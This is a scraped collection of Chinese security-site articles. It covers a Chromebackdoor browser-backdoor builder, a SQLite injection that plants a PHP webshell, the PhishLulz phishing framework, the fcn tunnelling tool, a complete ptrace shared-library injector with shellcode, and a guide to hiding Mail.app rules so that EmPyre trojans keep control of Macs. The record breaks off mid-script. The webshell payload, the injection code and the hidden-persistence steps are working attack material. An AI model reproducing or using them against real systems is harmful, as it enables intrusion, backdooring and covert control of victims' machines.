https://lynxframework.com/relais[?] Information correct [Y/n]? Y选择模块 (比如 FormGrabber V1.0)[?] please select numbers ? 2该脚本生成了 .crx .perm 和后门文件夹构建 .exe1) 使用 --build 参数python chromebackdoor.py --build 2) 选择后门 (比如 --chrome)[?] crx fime (/root/..) ? /root/backdoor.crx3) wine 启动 installer.exe 生成 bot.exeGenerate successful : {chromebackdoor_folder}/bot.exe  4) 用 Windows 启动 bot.exeWeb 控制端界面：","2017-01-10 15:12:42","安全工具","Chromebackdoor - 浏览器后门工具","http://nsoad.com/Security-tools/20170110/tools-1008.html"
"5ccbfab24f2f0a0a7a69c0ad","近期，我们对贝尔金WeMo智能家居设备的安全性进行了分析。在研究过程中，我们开发出了一种新型的SQL注入技术，这项技术针对的是SQLite数据库。","blackhold","前言近期，我们对贝尔金WeMo智能家居设备的安全性进行了分析。在研究过程中，我们开发出了一种新型的SQL注入技术，这项技术针对的是SQLite数据库。实验表明，我们可以利用这项SQLite注入技术在SQLite数据库中实现任意代码执行。这篇文章将会告诉大家如何去创建一个SQLite数据库，并且利用纯粹的SQL查询语句来执行一个ashShell脚本。我们认为，对于渗透测试人员和漏洞研究社区而言，这项技术的适用性是非常广泛的。我们希望这篇文章能够给各位带来有价值的信息，并且各位能够通过这篇文章中的内容自己动手复现这个漏洞。背景知识利用SQLite注入漏洞来执行任意代码的一个最简单的方法就是利用load_extension()函数来执行共享库中的某个函数。但是libsqlite3.so这个库默认是禁止这个功能的，因为这很明显就是一个安全漏洞。实际上，在某些SQLite injection cheat sheets（SQLite注入安全备忘单）中，也有人会使用一个ATTACH DATABASE语句来在目标Web服务器的根目录下创建SQLite文件。此时，攻击者就可以使用恶意PHP代码来对该文件进行处理，当攻击者向服务器请求该文件时，PHP解释器就会执行其中的恶意代码。相关代码如下所示：ATTACH DATABASE ‘/var/www/lol.php’ AS lol;CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES(‘&lt;?system($_GET[‘cmd’]); ?&gt;’);--ATTACH DATABASE语句首先会检查指定位置是否存在相应的文件。如果存在，那么它便会尝试将该文件视作一个SQLite数据库来打开。如果不存在，它将会在目标地址创建这个文件，并为这个SQLite数据库文件赋予读取和写入权限。在上面这个例子中，语句在/var/www/目录下创建了一个名为lol.php的文件，我们可以使用“lol”作为数据库名称来访问这个文件接下来，我们在“lol”数据库中创建了一个名为“pwn”的表，并向该表插入了一个字符串。当Web服务器请求该文件时，该数据库的后缀名“.php”将会触发Web服务器的PHP解释器。解释器会寻找文件中的“&lt;?”，并尝试执行该符号之后的所有语句，直到解释器扫描到“?&gt;”为止。在这种情况下，无论 “cmd”这个GET请求变量中包含的是怎样的代码，这些代码最终都会以系统命令的形式得到执行。这样一来，我们就可以使用这个方法来利用SQL注入漏洞实现任意命令执行了。但是大多数使用SQLite数据库的服务器中并不会安装PHP解释器，例如很多嵌入式系统就是这样。这样一来，我们的技术就不管用了。将SQLite当作一个ash脚本很多基于Linux的嵌入式系统都会使用BusyBox工具套件来实现绝大部分基础的Linux命令。默认情况下，BusyBox会使用ash shell来实现/bin/sh。所以我们打算看看是否可以创建一个SQLite数据库文件，并将其当作一个ash shell脚本来执行，而且我们希望只使用SQL语句就能够执行它。因为ash的命令解析器比PHP的代码解释器要复杂的多，所以我们就要想一些其他的办法了。不过幸运的是，ash比bash要简单得多，看来我们选择ash是正确的。首先我们要了解的是，ash的解析器对于换行符（“\n”）和圆括号（“（”和“）”）是非常敏感的。这是因为当用户在命令行中按下回车之后，便会插入一个新行，而括号中包含的指令是subshell所需要执行的指令。所以，如果我们能够找到某种方法可以在SQLite数据库文件中插入这些字符的话，我们就可以用它们来控制ash在处理这个文件时所采用的方式了。图片1:向一个SQLite数据库文件插入并保存换行符我们使用“插入换行符”这个技巧的主要依据为：SQLite数据库会将用于构造数据库模式的SQL语句保存下来，正如图片1顶部的CREATE语句所表示的那样，SQLite数据库会将我们的换行符保存在数据库模式的定义之中。图片1下半部分的代码显示的是我们将数据库文件以ash shell脚本来运行时的情况。ash报告的第一个错误是它无法找到“SQLite”命令，因为它在解析代码时，将文件中的第一个词当作了命令，然后将CREATE语句中的内容（换行符之前的代码）当作了命令的执行参数。这样一来，我们只需要插入新的一行，就可以让ash忽略整个文件的内容了。现在我们要解决的就是如何修复ash的第二个报错，即“unterminated quoted string”（未结束引用字符串）。图片2:执行“echo”命令很简单，解决第二个报错的方法就是另外插入新的一行。大家可以从图片2中看到，我们在新的一行中向CREATE语句中添加了“withoutrowid”。我们在定义完数据表中的列之后，又插入了一个换行符。这样一来，我们就用换行符包裹住了列定义语句了。当文件被当作脚本来解析时，列定义语句就会被视作一个单独的文本行。图片2底部的代码表面，当文件作为脚本来执行时，“echonone primary key”这条语句将会被解析为一个echo命令，“noneprimary key”会被输出到屏幕上。这样一来，我们就可以实现任意命令执行了，因为我们可以将列名修改为任何想要执行的命令。当然了，这还不是真正意义上的“任意命令执行”，因为我们无法在命令中设置任意参数。为了得到一个有效的列定义，列名之后的第一个词必须符合数据库的类型定义。图片3:使用SQLite数据库文件实现任意命令执行为了实现任意命令执行，我们先回顾一下之前运行PHP恶意代码所用的方法，即把需要执行的命令作为表的值来插入。大家可以在图片3中看到，我们也使用了同样的方法，只不过字符串的第一个字符和最后一个字符必须为换行符。总结阅读完这篇文章之后，大家应该已经知道了如何去创建一个可以被当作ash shell脚本的SQLite数据库文件了。最后，祝大家hacking愉快！","2016-11-22","漏洞发布","利用SQLite数据库文件实现任意代码执行","http://nsoad.com/Article/exploit/20161122/vulzone-37.html"
"5ccbfab24f2f0a0a7a69c0ae","2016年11月的新西兰黑客大会Kiwicon上，FortConsult的网络安全专家Michele Orru发布了一款自动化网络钓鱼工具，并且将其命名为PhishLulz。","kong","2016年11月的新西兰黑客大会Kiwicon上，FortConsult的网络安全专家Michele Orru发布了一款自动化网络钓鱼工具，并且将其命名为PhishLulz。这个钓鱼框架主要是由ruby所编写，并且运行起来十分高效。在演示过程中，安全专家只需要10分钟就能搭建起钓鱼环境，进行精确的钓鱼攻击。钓鱼框架特点该钓鱼框架已经开源，并且发布在了github上，目前已经有10人fork，60多人star。可以说这个开源项目受到很多人的关注，接下来的发展会越来越稳定和突出。特点该钓鱼框架主要是基于PhishingFrenzy和BeEF两大开源项目组建而成，从理论上来说，它有着那么几大特性。这个钓鱼框架可以建立一个SPF记录。也就是说，如果域名没有设置SPF记录，那么可以被该钓鱼框架伪造邮件。让我最感兴趣的还是它可以轻易的躲避垃圾邮件过滤器，成功的让对方收到钓鱼邮件。于此同时，它还可以通过图表记录钓鱼成功的人数，区域划分，目标IP地址等等信息。该钓鱼框架还可以自定义各种各样的模块，以此来针对不同目标的攻击人群。并且框架一直在持续增加和更新中。在最后这个框架还可以生成各种格式的钓鱼报告，来总结钓鱼攻击的详细信息。工具介绍phish_lulz：启动或者停止钓鱼攻击tools/find_resources：多线程子域名扫描和指纹扫描tools/mailboxbug: 多线程email数据发送模块tools/mail_parser：从.eml文件中提取HTML和TXT数据namecheap_wrapper: 自动化注册域名默认登陆口令MySQL root user: phishlulz_mysqlPhishingFrenzy admin user: phishlulz_frenzyBeEF beef user: phishlulz_beef要求1.亚马逊AWS的账号（在配置文件config.yaml处写上配置信息）2.不得是windows或者Mac OS系统3.具有ssh, scp和openssl服务4.具有Ruby环境5.Gecko或者Chrome内核类型的浏览器（比如firefox或者chrome浏览器）是福是祸？根据该意大利“老司机”Orru在会议上的演讲，可以总结得出，在早晨或者午餐后发送的钓鱼邮件更有成功率。在Orru对澳大利亚官员调查测试的过程中，有40%的澳大利亚公务员打开了钓鱼电子邮件，并且还发送了各种VPN登陆口令。而Orru这个“老司机”在短短两天内就获取到了各种域名的管理权限。实际上，针对邮件钓鱼的思路还是很多，而且普通员工很难注意到.com和.co邮件的区别。最近几年，网络安全产品如同雨后春笋般发芽生长，但是针对社工类的安全研究始终止步不前。这个钓鱼框架的发行，从好的一方面来看可以推动社工安全前进的脚步，从坏处来看大量的脚本小子将会运用该框架作为钓鱼邮件攻击等。其它该项目本身自带的自签名CA，但是需要注意的自动化域名注册功能是从TODO域名供应商那里注册，当然你也可以选择NameCheap域名供应商。Github项目地址：https://github.com/antisnatchor/phishlulz","2016-11-23 10:19:48","安全工具","高级自动化钓鱼框架PhishLulz已经发布，是灾难还是救星？","http://nsoad.com/Security-tools/20161123/tools-837.html"
"5ccbfab24f2f0a0a7a69c0af","free connect your private network from anywhere1. fcn是什么fcn[free connect]是一款傻瓜式的一键接入私有网络的工具, 由客户服务端和客户端组成fcn使用fcn公网数据服务","blackhold","free connect your private network from anywhere1. fcn是什么fcn[free connect]是一款傻瓜式的一键接入私有网络的工具, 由客户服务端和客户端组成fcn使用fcn公网数据服务器以及数据加密技术，将用户客户端虚拟接入客户服务端私有网络fcn = fcn_server + fcn_clientdownload fcn_beta binary https://github.com/boywhp/fcn/releases/download/fcn_beta3/fcn_beta.zipfcn接入原理示意图fcn_server目前支持linux x86 + x64平台，arm平台待支持中, 下一步考虑添加windows服务器接入支持文件位置    描述server_linux\ server32    接入服务器x86平台binserver_linux\ server    接入服务器x64平台binserver_linux\ server.conf    服务器配置文件fcn_client目前只支持windows x86/x64文件位置    描述client_windows\ x86    接入客户端x86平台binclient_windows\ x64    接入客户端x64平台bin2. fcn使用2.1 运行客户服务端首先配置server.conf配置文件, 注意目前测试帐户 FCN_0000-FCN_9999, 每个帐户限速100KB/s请用户随机挑选测试帐户，并且设置自己的唯一服务器名，以防止帐户冲突文件位置    描述[uid]    FCN_[0001-9999] 8字符用户ID *必填[name]    服务器名,程序通过该名称标示服务器, 同一个uid不可重复[psk]    连接密码, 建议不填, 由服务端启动时随机生成[nat_nic]    虚拟接入后连接的服务器网卡名, 建议不填[dhcp_ip/dhcp_mask]    虚拟接入后DHCP网段, 建议不填ROOT权限运行./server            # 命令行形式直接运行,临时测试nohup ./server &amp;    # 在后台运行  2.2 运行windows客户端主界面添加服务器,填写对应的连接参数,连接,成功后,windows客户端即接入了服务器对应局域网注:第一次连接时会自动安装虚拟网卡驱动,需用户确认同意3. fcn安全吗？3.1 fcn通信安全机制fcn使用了数字证书、tls以及aes 256bit加密技术，用户网络数据全程加密，5分钟左右自动更新会话密钥，确保用户数据不会被截获解密或者中间人欺骗。fcn公网服务器不会收集用户的任何网络数据，后期考虑开放用户加密接口，以便用户实现自定义的端到端私有加密。3.2 fcn本地安全fcn二进制文件发布前经过针对性的混淆加密处理，尽可能防止用户的加密配置文件被黑客攻击解密。3.3 fcn是专业软件fcn软件作者是boywhp，从事网络安全行业多年，是看雪安全论坛（bbs.pediy.com）高级会员，在业界发表过多篇网络安全技术文章。当然作者也深知在网络攻防上，没有绝对的安全，因此在这里还请各位同行手下留情。","2016-11-11 17:00:19","安全工具","fcn - 一键接入私有网络的工具","http://nsoad.com/Security-tools/20161111/tools-750.html"
"5ccbfab24f2f0a0a7a69c0b0","共享库基础知识程序由源代码变成可执行文件，一般可以分解为四个步骤，分别是预处理（Prepressing）、编译（Compilation）、汇编（Assembly）和链接（Linking）。预处理过","Kong","共享库基础知识程序由源代码变成可执行文件，一般可以分解为四个步骤，分别是预处理（Prepressing）、编译（Compilation）、汇编（Assembly）和链接（Linking）。预处理过程主要处理源代码中以“#”开始的预编译指令；编译过程把预处理完成的文件进行词法、语法、语义等分析并产生相应的汇编代码文件；汇编过程将汇编代码文件翻译成机器可以执行的目标文件；链接过程将汇编生成的目标文件集合相连接并生成最终的可执行文件。链接方式分为静态链接和动态链接，静态链接分发程序只需要生成的可执行文件，动态链接分发程序不仅需要可执行文件，还要包含相应的库文件。该库文件在Windows平台称为动态链接库（Dynamic-Link Library，DLL），在Linux平台一般称为共享库（Shared Object，SO）。Linux平台SO替换可以分为静态替换和动态替换：静态替换利用文件操作直接替换SO，新SO在下次加载时生效；动态替换利用代码注入替换目标进程内存空间，实现新SO的加载和替换，新SO立即生效。静态替换针对未被加载的SO，利用复制命令（cp new.so old.so）即可直接完成静态替换，新SO在下次加载时生效。对于已经加载的原SO，直接用新SO复制替换将会导致相应程序崩溃，此种情况可以使用删除原SO（rm -f old.so）或修改原SO名称（mv old.so oldx.so）后，再复制新SO的方法代替，新SO同样在下次加载时生效。程序崩溃的原因是复制替换操作会破坏系统访问原SO的索引节点inode，导致系统找不到原SO。系统为每个加载到内存中的文件创建对应的inode，用来管理该文件，inode包含了文件的元信息，如文件字节数、拥有者ID、读写执行权限等。系统以inode标识程 序加载的SO，不再关心文件名，修改SO名称并未改变对应inode，因此程序可以继续正常运行；删除SO只是无法查看，系统直到程序释放SO后才真正删除SO和inode，因此程序也可以继续正常运行；但是在直接复制替换时，新SO将会继承原SO的inode，程序无法继续访问原SO，从而导致程序崩溃。动态替换针对已经被程序加载的SO，为了实现不停止程序，替换后的SO立即生效的目的，可以采用动态替换。动态替换的对象既可以是SO整体，也可以是SO中的特定函数。两者的区别主要是整体替换需要在特定函数替换的基础上再增加SO加载及输出函数重定位等过程。由于时间有限， 本文仅介绍特定函数动态替换的基本原理和初步实现，SO整体替换感兴趣的 读者可以自行尝试。SO特定函数动态替换主要包括三个关键过程：控制目标进程，构造替换内容和确定替换地址，实际上依次解决的就是利用什么替换、替换什么内容和替换到哪里的问题。控制目标进程为实现对其它进程空间或运行进行控制， Linux平台提供了进程跟踪函数Ptrace()（类似于Windows平台的创建远程线程函数CreateRemoteThread()）。Ptrace()函数引用头文件和参数形式如下：#include&lt;sys/ptrace.h&gt;int ptrace(int request,int pid,int addr,int data);其中，request参数决定了该函数的调用功能。PTRACE_ATTACH/ PTRACE_DETACHint ptrace(PTRACE_ATTACH,Pid,NULL,NULL);int ptrace(PTRACE_DETACH,Pid,NULL,NULL);分别实现跟踪和结束跟踪目标进程功能。Pid表示目标进程标识符。成功跟踪后，被跟踪进程将成为当前进程的子进程，并进入中止状态。PTRACE_POKEDATAint ptrace(PTRACE_?POKEDATA,Pid,Addr,Data);实现向目标进程内存中写入一个字节数据功能。Pid表示目标进程标识符，Addr存储写入的内存地址，Data为要写入的数据。除了以上本文中用到的功能，Ptrace()函数还提供数据读取（PTRACE_PEEKDATA）、终止进程（PTRACE_KILL）和重新运行（PTRACE_CONT）等功能，针对Intel386平台还提供读取和设置寄存器等功能。SO特定函数动态替换主要过程活动图如图1所示，其中跟踪和结束跟踪目标进程过程由Ptrace()函数直接完成，替换目标进程内存过程由Ptrace()配合构造的替换内容共同完成。构造替换内容构造替换内容主要包括两方面工作，一是分析被替换函数的特征，确定替换空间结构和堆栈恢复指令；二是完成替换函数的编译、Shellcode提取及再构造。被替换函数特征分析测试被替换函数hello()存在于SO的libfso.so中，由主程序main载入并以固定周期循环调用，其反汇编代码如图2所示。由图可知，方框标识的代码为堆栈平衡和函数返回指令，函数实际执行部分为地址hello+8至hello+60之间。因此包含堆栈恢复和函数返回指令（2字节）的最大可替换空间地址为hello+8至hello+61，共计54个字节。替换函数编译再构造测试替换函数汇编代码如图3所示，功能为输出Hello World!字符，其中方框标识的空指令是为堆栈恢复和函数返回指令预留的存储空间。经过编译提取后可以得到46个字节的Shellcode，为了避免程序误将helloworld字符理解成指令执行导致程序崩溃，还需要将原函数的堆栈恢复和函数返回指令拷贝至预留的空指令位置，提前返回函数。成功替换后的被替换函数结构如图4所示，其中小方格内为堆栈平衡和函数返回指令，大方格内为构造的替换内容。图 3测试替换函数汇编代码图 4成功替换后实际结构确定替换地址由于地址加载随机化ASLR（Address space layout randomization）的影响，SO加载到内存的基地址并不固定，但是函数相对于基地址的偏移地址是固定不变的。因此对被替换函数所在SO进行反汇编分析，可以确定被替换函数替换位置首地址，再配合linux提供的进程虚拟地址空间查看命令得到SO加载基地址，简单相减即可得到被替换函数位置相对偏移地址。待准备实施替换时，只需再次利用进程虚拟地址空间查看命令获得基地址加上相对地址就可以确定实际替换首地址。图5中地址0x2b6901e0f000为测试程序SO加载基地址，图6中0x2b6901e0f514为函数替换位置首地址，相减得到0×514，即为被替换函数替换起始位置的相对偏移地址。图 5共享库加载基地址图 6替换位置首地址测试实例测试环境CentOS 6.6 (Final)Linux version 2.6.32gcc version 4.4.7 20120313nasm version 2.07前文截图为64位系统情况，以下为32位系统情况。被动态替换程序【动态链接库】//fso.c//gcc -c -Wall -Werror -fPIC fso.c//gcc -shared -o libfso.so fso.o#include &lt;stdio.h&gt;void hello(){    int i = 0;    int j = 0;    printf(""Hello Myboy!\n"");    for(i=0; i&lt;10000000; i++)    {        j++;    }}以上代码中的for循环，仅仅是为了确保Shellcode在替换时具有足够的存储空间。【被动态替换程序】//main.c//gcc -L /home/mycos/so -Wall -o main main.c -lfso//export LD_LIBRARY_PATH=/home/mycos/so :$LD_LIBRARY_PATH#include &lt;stdio.h&gt;extern void hello(void);int main(){    int i = 0;    printf(""This is Main!\n"");    while(1)    {        if(i%10 == 0) printf(""\n"");        sleep(1);        hello();        i++;    }       return 0;}详细信息或出现错误请参见 加载动态链接库so程序简单实例Shellcode【hello.asm】; 32-bit ""Hello World!"" in CentOS 6 i686; nasm -felf32 hello.asm -o hello.o; ld -s -o hello hello.oglobal _start_start:    jmp stringcode:    pop     ecx    mov     eax, 0x4    mov     ebx, 0x1    mov     edx, 0xD    int     0x80    nop    nop    nop    nop    nop    nop    nop    nopstring:    call    code    db 'Hello world!',0x0a以上空指令nop，是为堆栈恢复和函数返回指令预留的存储空间，预留空指令空间必须比被替换程序动态库堆栈恢复和函数返回指令占用的空间大。【提取Shellcode】for i in $(objdump -d hello |grep ""^ "" |cut -f2); do echo -n '\x'$i; done; echo执行以上命令得到如下Shellcode，共计49个字节，但是该Shellcode还不能直接使用，需要根据目标程序动态链接库实际情况进行修改。\xe9\x1a\x00\x00\x00\x59\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xba\x0d\x00\x00\x00\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\xe8\xdf\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x21\x0a【修改Shellcode】利用GDB调试被替换程序，得到动态库中函数堆栈恢复和函数返回的代码。[mycos@localhost so]$ gdb main(gdb) b helloBreakpoint 1 at 0x804842c(gdb) rStarting program: /home/mycos/so/main This is Main!Breakpoint 1, 0x00111434 in hello () from /home/mycos/so/libfso.so(gdb) disas helloDump of assembler code for function hello:   0x00111430 &lt;+0&gt;:     push   %ebp   0x00111431 &lt;+1&gt;:     mov    %esp,%ebp   0x00111433 &lt;+3&gt;:     push   %ebx=&gt; 0x00111434 &lt;+4&gt;:     sub    $0x24,%esp   0x00111437 &lt;+7&gt;:     call   0x111429 &lt;__i686.get_pc_thunk.bx&gt;   0x0011143c &lt;+12&gt;:    add    $0x1190,%ebx   0x00111442 &lt;+18&gt;:    movl   $0x0,-0x10(%ebp)   0x00111449 &lt;+25&gt;:    movl   $0x0,-0xc(%ebp)   0x00111450 &lt;+32&gt;:    lea    -0x10f8(%ebx),%eax   0x00111456 &lt;+38&gt;:    mov    %eax,(%esp)   0x00111459 &lt;+41&gt;:    call   0x111334 &lt;puts@plt&gt;   0x0011145e &lt;+46&gt;:    movl   $0x0,-0x10(%ebp)   0x00111465 &lt;+53&gt;:    jmp    0x11146f &lt;hello+63&gt;   0x00111467 &lt;+55&gt;:    addl   $0x1,-0xc(%ebp)   0x0011146b &lt;+59&gt;:    addl   $0x1,-0x10(%ebp)   0x0011146f &lt;+63&gt;:    cmpl   $0x98967f,-0x10(%ebp)   0x00111476 &lt;+70&gt;:    jle    0x111467 &lt;hello+55&gt;   0x00111478 &lt;+72&gt;:    add    $0x24,%esp   0x0011147b &lt;+75&gt;:    pop    %ebx   0x0011147c &lt;+76&gt;:    pop    %ebp   0x0011147d &lt;+77&gt;:    ret    End of assembler dump.(gdb) x /8xb 0x1114780x111478 &lt;hello+72&gt;:    0x83    0xc4    0x24    0x5b    0x5d    0xc3    0x90    0x90分析动态库hello函数的汇编代码，可以较容易的判断出恢复堆栈和函数返回的地址从0×00111478到0x0011147d共6个字节，且该函数实际可被shellcode覆盖填充的部分从0×00111437（函数开始的堆栈平衡处理部分不能覆盖，易导致异常）到0x0011147d共70个字节大于shellcode的49个字节，满足替换空间要求。因此最后得到的Shellcode如下：\xe9\x1a\x00\x00\x00\x59\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xba\x0d\x00\x00\x00\xcd\x80\x83\xc4\x24\x5b\x5d\xc3\x90\x90\xe8\xdf\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x21\x0a查看被替换程序的内存分配情况，得到动态链接库加载基址（0×00111000），结合上面GDB调试得到的函数替换起始地址（0×00111437），可以确定替换地址的固定偏移量为0×437，因此只要替换程序确定动态链接库基址，即可利用固定偏移量得到替换起始地址。[mycos@localhost asm]$ ps aux | grep mainmycos    13626  0.0  1.3  22292 14376 pts/2    S+   00:17   0:00 gdb mainmycos    13628  0.0  0.0   1872   344 pts/2    T    00:17   0:00 /home/mycos/so/mainmycos    13793  0.0  0.0   4352   724 pts/3    S+   01:08   0:00 grep main[mycos@localhost asm]$ cat /proc/13628/maps00110000-00111000 r-xp 00000000 00:00 0          [vdso]00111000-00112000 r-xp 00000000 08:02 1054157    /home/mycos/so/libfso.so00112000-00113000 rw-p 00000000 08:02 1054157    /home/mycos/so/libfso.so008ed000-0090b000 r-xp 00000000 08:02 1053999    /lib/ld-2.12.so0090b000-0090c000 r--p 0001d000 08:02 1053999    /lib/ld-2.12.so0090c000-0090d000 rw-p 0001e000 08:02 1053999    /lib/ld-2.12.so00913000-00aa3000 r-xp 00000000 08:02 1054095    /lib/libc-2.12.so00aa3000-00aa5000 r--p 00190000 08:02 1054095    /lib/libc-2.12.so00aa5000-00aa6000 rw-p 00192000 08:02 1054095    /lib/libc-2.12.so00aa6000-00aa9000 rw-p 00000000 00:00 0 08048000-08049000 r-xp 00000000 08:02 1054152    /home/mycos/so/main08049000-0804a000 rw-p 00000000 08:02 1054152    /home/mycos/so/mainb7ff1000-b7ff2000 rw-p 00000000 00:00 0 b7ffe000-b8000000 rw-p 00000000 00:00 0 bffeb000-c0000000 rw-p 00000000 00:00 0          [stack]动态替换程序//injectso.c//gcc injectso.c -o injectso#include &lt;sys/ptrace.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/file.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;const int long_size = sizeof(long);void getdata(pid_t child, long addr, char *str, int len){    char *laddr;    int i,j;    union u{        long val;        char chars[long_size];    }data;    i = 0;    j = len / long_size;    laddr = str;    while(i &lt; j){        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i*4, NULL);        if (data.val &lt; 0) {            printf(""getdata1 Failed! \n"");            return;        }        memcpy(laddr, data.chars, long_size);        ++i;        laddr += long_size;    }    j = len % long_size;    if(j != 0){        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i*4, NULL);        if (data.val &lt; 0) {            printf(""getdata2 Failed! \n"");            return;        }        memcpy(laddr, data.chars, j);    }    str[len] = ' ';}void putdata(pid_t child, long addr, char *str, int len){    char *laddr;    int i,j;    union u{        long val;        char chars[long_size];    }data;    long rst;     i = 0;    j = len / long_size;    laddr = str;    while(i &lt; j){        memcpy(data.chars, laddr, long_size);        rst = ptrace(PTRACE_POKEDATA, child, addr + i*4, data.val);        if (rst &lt; 0) {            printf(""Putdata1 Failed! \n"");            return;        }        ++i;        laddr += long_size;    }    j = len % long_size;    if(j != 0){        memcpy(data.chars, laddr, j);        rst = ptrace(PTRACE_POKEDATA, child, addr + i*4, data.val);        if (rst &lt; 0) {            printf(""Putdata2 Failed! \n"");            return;        }    }}long getsobaseaddr(pid_t pid, char* soname){    FILE *fp;    char filename[30];    char line[100];    long addr;    char str[100];    sprintf(filename, ""/proc/%d/maps"", pid);    fp = fopen(filename, ""r"");    if(fp == NULL)        return 1;    while(fgets(line, 100, fp) != NULL) {        sscanf(line, ""%x-%*s %*s %*s %*s %*s %s"", &amp;addr,                str, str, str, str, str, str);        if(strstr(str, soname) != NULL)            break;    }    fclose(fp);    return addr + 0x437; //offset}int main(int argc, char *argv[]){    pid_t traced_process;    struct user_regs_struct regs;    int len = 49;    /* hello world */    char code[] =        ""\xe9\x1a\x00\x00\x00\x59\xb8\x04""        ""\x00\x00\x00\xbb\x01\x00\x00\x00""        ""\xba\x0d\x00\x00\x00\xcd\x80\x83""        ""\xc4\x24\x5b\x5d\xc3\x90\x90\xe8""        ""\xe1\xff\xff\xff\x48\x65\x6c\x6c""        ""\x6f\x20\x77\x6f\x72\x6c\x64\x21""        ""\x0a"";    if(argc != 2) {        printf(""PID?\n"");        return 1;    }    traced_process = atoi(argv[1]);    ptrace(PTRACE_ATTACH, traced_process, NULL, NULL);    int pid = wait(NULL);    printf(""Attach Pid: %d\n"",pid);    ptrace(PTRACE_GETREGS, traced_process, NULL, &amp;regs);    long helloaddr = getsobaseaddr(traced_process, ""libfso.so"");    printf(""Inject So Addr: %p\n"", helloaddr);    putdata(traced_process, helloaddr, code, len);    ptrace(PTRACE_SETREGS, traced_process, NULL, &amp;regs);    ptrace(PTRACE_DETACH, traced_process, NULL, NULL);    return 0;}在x86_64平台下，以上代码需要进行适当修改：一是头文件由 sys/user.h 改成 linux/user.h；二是getdata/putdata函数中涉及地址的位置由 4 改成 8；三是user_regs_struct结构体的指令寄存器由 eip 改成 rip；四是shellcode修改适用于x86_64平台。执行结果执行动态替换程序，被替换程序输出由Hello Myboy! 变成 Hello world! 且继续正常运行，说明替换已成功。[mycos@localhost so]$ ps aux | grep mainmycos    13834 12.2  0.0   1872   384 pts/0    T    21:16   0:03 ./mainmycos    13293  0.0  0.0   4352   720 pts/1    S+   21:16   0:00 grep main[mycos@localhost so]$ ./injectso 13834[mycos@localhost so]$ ./mainThis is Main!Hello Myboy!Hello Myboy!Hello Myboy!Hello Myboy!Hello Myboy!Hello Myboy!Hello Myboy!Hello Myboy!Hello Myboy!Hello Myboy!Hello Myboy!Hello Myboy!Hello world!Hello world!Hello world!Hello world!参 考http://www.linuxidc.com/Linux/2011-01/31622.htmhttp://www.cnblogs.com/itech/archive/2012/05/15/2502284.htmlhttp://blog.csdn.net/myarrow/article/details/9630377http://blog.csdn.net/tju355/article/details/6884696http://theantway.com/2013/01/notes-for-playing-with-ptrace-on-64-bits-ubuntu-12-10/http://www.cnblogs.com/wangkangluo1/archive/2012/06/05/2535484.htmlhttp://blog.sina.com.cn/s/blog_4ac74e9a0100n7w1.htmlhttp://blog.sina.com.cn/s/blog_601f224a01013alj.html","2016-10-19 17:00:01","系统安全","如何进行Linux平台共享库替换","http://nsoad.com/Article/system/20161019/599.html"
"5ccbfabc4f2f0a0a7a69c0b1","关于木马稳定控制Mac，有很多种方式，今天跟大家探讨一个通过email稳定控制Mac的方式。网上有一些介绍的文章，但是坑多，现将本人测试经验整理，共同学习。","Kong","关于木马稳定控制Mac，有很多种方式，今天跟大家探讨一个通过email稳定控制Mac的方式。网上有一些介绍的文章，但是坑多，现将本人测试经验整理，共同学习。文章整体分为三个部分，第一部分简单介绍远控工具，第二部分介绍如何通过email去启动木马，第三部分关于全版本MacOS适用的提权一、远控使用Empyre，纯python的渗透工具，使用完全类似于Empiregit clone https://github.com/adaptivethreat/EmPyre.gitcd EmPyrepython empyre设置LinstenersListenersrun         //本次测试使用默认地址，根据情况更改配置生成回连脚本usestarger bashset Listener test   // 设置好的listeners名字generate至此，远控回连设置完毕关于mac平台的远控的选择，还可以选择其他多种工具，像JS-Rat 等等等。。。因为MacOS支持各多种脚本的运行，像javascript，python 等。或者就最简单的反弹一个shell回来，类Unix平台的控制程序多种多样，根据自己情况先择就好。二、启动MacOS自带的Mail.APP有一个添加规则的功能，触发后可以执行脚本，具体步骤如下：依次点击  邮件－偏好设置－规则－添加规则，就可以按照常规方式添加规则然后选择合适的触发规则最后选择触发后的行为触发后执行的AppleScript 为script.scpt文件，必须位于：/Users/$USER/Library/Application Scripts/com.apple.mail/文件夹中，并且以scpt后缀为了便于隐藏，推荐直接修改配置文件，设置规则。在配置文件上修改应用的规则不会显示到GUI界面，有较强的隐蔽性。邮件规则存储文件：/Users/$USER/Library/Mail/$VERSION/MailData/SyncedRules.plist“$USER”就是目标用户的用户名称，“$VERSION”是相应的版本号，版本对应如下：MacOS Sierra (10.12)V4OS X El Capitan (10.11)V3OS X Lion (10.7)V2OS X Yosemite (10.10)V2如果机器开启了iCloud同步，那么规则将会被存储到另一位文件中，位于：/Users/$USER/Library/Mobile Documents/com~apple~mail/Data/$VERSION/MailData/SyncedRules.plist需要注意的是该文件比上一个的文件有高优先级，并且新规则在Mail.APP重启之后生效。以下是规则文件中内容            AllCriteriaMustBeSatisfied        NO        AppleScript        script.scpt        AutoResponseType        0        CopyToMailbox        Trash        CopyToMailboxURL        Trash        Criteria                                                CriterionUniqueId                    003AC288-64E4-4FA6-99DC-20DDDBA8DDAA                    Expression                    test-123                    Header                    Body                                    Deletes        YES        HighlightTextUsingColor        NO        Mailbox        Trash        MailboxURL        Trash        MarkFlagged        NO        MarkRead        NO        NotifyUser        NO        RuleId        63C428FB-2634-4C0C-ACCA-9DA68229BC29        RuleName        delete        SendNotification        NO        ShouldCopyMessage        NO        ShouldTransferMessage        NO        TimeStamp        461321588        Version        1        代码中的“test-123” 就是触发字符，触发位置设置为“Body”正文中，配置代码如下：Expressiontest-123HeaderBody执行的AppleScript脚本文件名称为script.scptAppleScriptscript.scpt启用这个规则，只需要将“RuleId” 添加到“RulesActiveState.plist” 文件中，例如63C428FB-2634-4C0C-ACCA-9DA68229BC29测试脚本文件内容为：do shell script ""date &gt; /Users/$USER/Desktop/test.txt ; 